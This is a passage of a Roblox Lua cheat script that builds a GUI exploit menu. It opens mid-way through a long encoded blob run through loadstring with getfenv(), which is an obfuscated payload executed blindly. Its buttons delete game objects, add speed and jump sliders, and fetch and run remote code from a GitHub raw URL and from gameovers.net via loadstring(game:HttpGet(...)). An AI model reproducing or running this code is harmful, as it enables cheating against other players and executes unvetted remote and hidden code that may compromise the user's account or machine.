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"
            ),
            getfenv()
        )()
    end
)
a.skyfu.MouseButton1Down:Connect(
    function()
        for u, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "AntiFallPart" then
                v:Destroy()
            end
        end
        wait(1.3)
        game.Workspace.AntiFallPart.Size = Vector3.new(2048, 1, 2048)
    end
)
a.skyfu.MouseButton1Down:connect(
    function()
        for u, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "Stair1" then
                v:Destroy()
            end
        end
        for u, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "Stair2" then
                v:Destroy()
            end
        end
        for u, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "Stair3" then
                v:Destroy()
            end
        end
        for u, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "Stair4" then
                v:Destroy()
            end
        end
        for u, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "Stair5" then
                v:Destroy()
            end
        end
        for u, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "Stair6" then
                v:Destroy()
            end
        end
        for u, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "Stair7" then
                v:Destroy()
            end
        end
        for u, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "Stair8" then
                v:Destroy()
            end
        end
        for u, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "Stair9" then
                v:Destroy()
            end
        end
        for u, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "Stair10" then
                v:Destroy()
            end
        end
        for u, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "Stair11" then
                v:Destroy()
            end
        end
        for u, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "Stair12" then
                v:Destroy()
            end
        end
        for u, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "Stair13" then
                v:Destroy()
            end
        end
        for u, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "Stair14" then
                v:Destroy()
            end
        end
        for u, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "Stair15" then
                v:Destroy()
            end
        end
        for u, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "Stair16" then
                v:Destroy()
            end
        end
        for u, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "Stair17" then
                v:Destroy()
            end
        end
        for u, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "Stair18" then
                v:Destroy()
            end
        end
        for u, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "Stair19" then
                v:Destroy()
            end
        end
        for u, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "Stair20" then
                v:Destroy()
            end
        end
        for u, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "Stair21" then
                v:Destroy()
            end
        end
        for u, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "Stair22" then
                v:Destroy()
            end
        end
        for u, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "Stair23" then
                v:Destroy()
            end
        end
        for u, v in pairs(game.Workspace:GetDescendants()) do
            if v.Name == "Stair24" then
                v:Destroy()
            end
        end
        wait(1.5)
        loadstring(game:HttpGet("https://raw.githubusercontent.com/cfeciefe/qH4lF2gC3yM2vG6j/main/skystair"))()
    end
)
a.UICorner_99.CornerRadius = UDim.new(0, 4)
a.UICorner_99.Parent = a.skyfu
a.hitboxexpander.Name = "hitboxexpander"
a.hitboxexpander.Parent = a.scriped_2
a.hitboxexpander.AnchorPoint = Vector2.new(0.5, 0)
a.hitboxexpander.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.hitboxexpander.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.hitboxexpander.BorderSizePixel = 2
a.hitboxexpander.Position = UDim2.new(0.5, 0, 0.0440992974, 0)
a.hitboxexpander.Size = UDim2.new(1, 0, -0.00717593404, 30)
a.hitboxexpander.ZIndex = 2
a.hitboxexpander.Font = Enum.Font.SourceSansBold
a.hitboxexpander.Text = "Hitbox Expander"
a.hitboxexpander.TextColor3 = Color3.fromRGB(204, 204, 204)
a.hitboxexpander.TextScaled = true
a.hitboxexpander.TextSize = 14.000
a.hitboxexpander.TextWrapped = true
a.hitboxexpander.MouseButton1Down:connect(
    function()
        loadstring(game:HttpGet("http://gameovers.net/Scripts/Free/HitboxExpander/main.lua", true))()
    end
)
a.UICorner_109.CornerRadius = UDim.new(0, 4)
a.UICorner_109.Parent = a.hitboxexpander
a.HomeFrame.Name = "HomeFrame"
a.HomeFrame.Parent = a.PagesFrame
a.HomeFrame.Active = true
a.HomeFrame.BackgroundTransparency = 1.000
a.HomeFrame.BorderSizePixel = 0
a.HomeFrame.Position = UDim2.new(0, 6, 0, 9)
a.HomeFrame.Size = UDim2.new(1.33246756, -142, 1.09487176, -56)
a.HomeFrame.Visible = false
a.HomeFrame.CanvasSize = UDim2.new(0, 0, 0, 604)
a.HomeFrame.ScrollBarThickness = 3
a.UIListLayout_27.Parent = a.HomeFrame
a.UIListLayout_27.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_27.Padding = UDim.new(0, 10)
a.homur.Name = "homur"
a.homur.Parent = a.HomeFrame
a.homur.Active = true
a.homur.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.homur.Size = UDim2.new(1, -10, 0, 36)
a.UICorner_100.CornerRadius = UDim.new(0, 3)
a.UICorner_100.Parent = a.homur
a.skriper_3.Name = "skriper"
a.skriper_3.Parent = a.homur
a.skriper_3.Active = true
a.skriper_3.BackgroundTransparency = 1.000
a.skriper_3.Position = UDim2.new(0, 8, 0, 8)
a.skriper_3.Size = UDim2.new(1, -16, 1, -16)
a.UIListLayout_28.Parent = a.skriper_3
a.UIListLayout_28.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_28.Padding = UDim.new(0, 4)
a.Title_11.Name = "Title"
a.Title_11.Parent = a.skriper_3
a.Title_11.Active = true
a.Title_11.BackgroundTransparency = 1.000
a.Title_11.Size = UDim2.new(1, 0, 0, 20)
a.Title_11.Font = Enum.Font.GothamSemibold
a.Title_11.Text = "Home"
a.Title_11.TextColor3 = Color3.fromRGB(255, 255, 255)
a.Title_11.TextSize = 14.000
a.Title_11.TextXAlignment = Enum.TextXAlignment.Left
a.hom.Name = "hom"
a.hom.Parent = a.HomeFrame
a.hom.Active = true
a.hom.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.hom.Position = UDim2.new(0, 0, -0.482479781, 0)
a.hom.Size = UDim2.new(1, -10, 0.402972192, 36)
a.UICorner_101.CornerRadius = UDim.new(0, 3)
a.UICorner_101.Parent = a.hom
a.scriped_3.Name = "scriped"
a.scriped_3.Parent = a.hom
a.scriped_3.Active = true
a.scriped_3.BackgroundTransparency = 1.000
a.scriped_3.Position = UDim2.new(0, 8, 0, 8)
a.scriped_3.Size = UDim2.new(1, -16, 1, -16)
a.Title_12.Name = "Title"
a.Title_12.Parent = a.scriped_3
a.Title_12.Active = true
a.Title_12.BackgroundTransparency = 1.000
a.Title_12.Size = UDim2.new(1, 0, 0, 20)
a.Title_12.Font = Enum.Font.GothamSemibold
a.Title_12.Text = "Home"
a.Title_12.TextColor3 = Color3.fromRGB(255, 255, 255)
a.Title_12.TextSize = 14.000
a.Title_12.TextXAlignment = Enum.TextXAlignment.Left
a.TextLabel_16.Parent = a.scriped_3
a.TextLabel_16.Active = true
a.TextLabel_16.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
a.TextLabel_16.BackgroundTransparency = 1.000
a.TextLabel_16.Position = UDim2.new(0.0463768095, 0, 0.0814101323, 0)
a.TextLabel_16.Size = UDim2.new(0, 64, 0, 28)
a.TextLabel_16.Font = Enum.Font.GothamBlack
a.TextLabel_16.Text = "Speed:"
a.TextLabel_16.TextColor3 = Color3.fromRGB(255, 255, 255)
a.TextLabel_16.TextSize = 14.000
a.TextLabel_16.TextWrapped = true
a.TextLabel_17.Parent = a.scriped_3
a.TextLabel_17.Active = true
a.TextLabel_17.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
a.TextLabel_17.BackgroundTransparency = 1.000
a.TextLabel_17.Position = UDim2.new(0.0148191582, 0, 0.257582784, 0)
a.TextLabel_17.Size = UDim2.new(0, 85, 0, 28)
a.TextLabel_17.Font = Enum.Font.GothamBlack
a.TextLabel_17.Text = "JumpPower:"
a.TextLabel_17.TextColor3 = Color3.fromRGB(255, 255, 255)
a.TextLabel_17.TextSize = 14.000
a.TextLabel_17.TextWrapped = true
a.JumpPower.Name = "JumpPower"
a.JumpPower.Parent = a.scriped_3
a.JumpPower.Active = true
a.JumpPower.BackgroundColor3 = Color3.fromRGB(113, 113, 113)
a.JumpPower.BorderColor3 = Color3.fromRGB(0, 0, 0)
a.JumpPower.BorderSizePixel = 4
a.JumpPower.Position = UDim2.new(0.29245612, 0, 0.269123852, 0)
a.JumpPower.Size = UDim2.new(0, 249, 0, 14)
a.mdifier.Name = "mdifier"
a.mdifier.Parent = a.JumpPower
a.mdifier.AnchorPoint = Vector2.new(0.5, 0.5)
a.mdifier.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
a.mdifier.BorderColor3 = Color3.fromRGB(0, 0, 0)
a.mdifier.BorderSizePixel = 4
a.mdifier.Position = UDim2.new(0.016064262, 0, 0.4375, 0)
a.mdifier.Size = UDim2.new(0, 9, 0, 17)
a.mdifier.Font = Enum.Font.SourceSans
a.mdifier.Text = ""
a.mdifier.TextColor3 = Color3.fromRGB(0, 0, 0)
a.mdifier.TextSize = 14.000
a.FOVValue.Name = "FOVValue"
a.FOVValue.Parent = a.JumpPower
a.FOVValue.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
a.FOVValue.BackgroundTransparency = 1.000
a.FOVValue.Position = UDim2.new(-0.0868395418, 0, -0.9375, 0)
a.FOVValue.Size = UDim2.new(0.0791716576, 0, 2.91257501, 0)
a.FOVValue.Font = Enum.Font.SourceSans
a.FOVValue.Text = "0"
a.FOVValue.TextColor3 = Color3.fromRGB(255, 255, 255)
a.FOVValue.TextScaled = true
a.FOVValue.TextSize = 14.000
a.FOVValue.TextWrapped = true
a.SpeedGui.Name = "SpeedGui"
a.SpeedGui.Parent = a.scriped_3
a.SpeedGui.Active = true
a.SpeedGui.BackgroundColor3 = Color3.fromRGB(113, 113, 113)
a.SpeedGui.BorderColor3 = Color3.fromRGB(0, 0, 0)
a.SpeedGui.BorderSizePixel = 4
a.SpeedGui.Position = UDim2.new(0.296398908, 0, 0.0976840407, 0)
a.SpeedGui.Size = UDim2.new(0, 249, 0, 14)
a.mdifier_2.Name = "mdifier"
a.mdifier_2.Parent = a.SpeedGui
a.mdifier_2.AnchorPoint = Vector2.new(0.5, 0.5)
a.mdifier_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
a.mdifier_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
a.mdifier_2.BorderSizePixel = 4
a.mdifier_2.Position = UDim2.new(0.016064262, 0, 0.4375, 0)
a.mdifier_2.Size = UDim2.new(0, 9, 0, 17)
a.mdifier_2.Font = Enum.Font.SourceSans
a.mdifier_2.Text = ""
a.mdifier_2.TextColor3 = Color3.fromRGB(0, 0, 0)
a.mdifier_2.TextSize = 14.000
a.FOVValue_2.Name = "FOVValue"
a.FOVValue_2.Parent = a.SpeedGui
a.FOVValue_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
a.FOVValue_2.BackgroundTransparency = 1.000
a.FOVValue_2.Position = UDim2.new(-0.076305218, 0, -1.17647052, 0)
a.FOVValue_2.Size = UDim2.new(0.0606052093, 0, 3, 0)
a.FOVValue_2.Font = Enum.Font.SourceSans
a.FOVValue_2.Text = "0"
a.FOVValue_2.TextColor3 = Color3.fromRGB(255, 255, 255)
a.FOVValue_2.TextScaled = true
a.FOVValue_2.TextSize = 14.000
a.FOVValue_2.TextWrapped = true
a.Frame_9.Parent = a.hom
a.Frame_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
a.Frame_9.Position = UDim2.new(0, 0, 0.433356822, 0)
a.Frame_9.Size = UDim2.new(0, 361, 0, 0)
a.re.Name = "re"
a.re.Parent = a.hom
a.re.AnchorPoint = Vector2.new(0.5, 0)
a.re.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.re.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.re.BorderSizePixel = 2
a.re.Position = UDim2.new(0.5, 0, 0.443, 0)
a.re.Size = UDim2.new(1, 0, 0, 30)
a.re.ZIndex = 2
a.re.Font = Enum.Font.SourceSansBold
a.re.Text = "Reset Your Character"
a.re.TextColor3 = Color3.fromRGB(204, 204, 204)
a.re.TextScaled = true
a.re.TextSize = 14.000
a.re.TextWrapped = true
a.re.MouseButton1Down:connect(
    function()
        game.Players.LocalPlayer.Character.Humanoid.Health = 0
    end
)
a.UICorner_102.CornerRadius = UDim.new(0, 4)
a.UICorner_102.Parent = a.re
a.kickyourself.Name = "kickyourself"
a.kickyourself.Parent = a.hom
a.kickyourself.AnchorPoint = Vector2.new(0.5, 0)
a.kickyourself.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.kickyourself.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.kickyourself.BorderSizePixel = 2
a.kickyourself.Position = UDim2.new(0.499, 0, 0.576, 0)
a.kickyourself.Size = UDim2.new(1, 0, 0, 30)
a.kickyourself.ZIndex = 2
a.kickyourself.Font = Enum.Font.SourceSansBold
a.kickyourself.Text = "Kick Yourself"
a.kickyourself.TextColor3 = Color3.fromRGB(204, 204, 204)
a.kickyourself.TextScaled = true
a.kickyourself.TextSize = 14.000
a.kickyourself.TextWrapped = true
a.kickyourself.MouseButton1Down:connect(
    function()
        game.Players.LocalPlayer:Kick("You Kicked")
    end
)
a.UICorner_103.CornerRadius = UDim.new(0, 4)
a.UICorner_103.Parent = a.kickyourself
a.crashurgame.Name = "crashurgame"
a.crashurgame.Parent = a.hom
a.crashurgame.AnchorPoint = Vector2.new(0.5, 0)
a.crashurgame.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.crashurgame.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.crashurgame.BorderSizePixel = 2
a.crashurgame.Position = UDim2.new(0.499, 0, 0.713, 0)
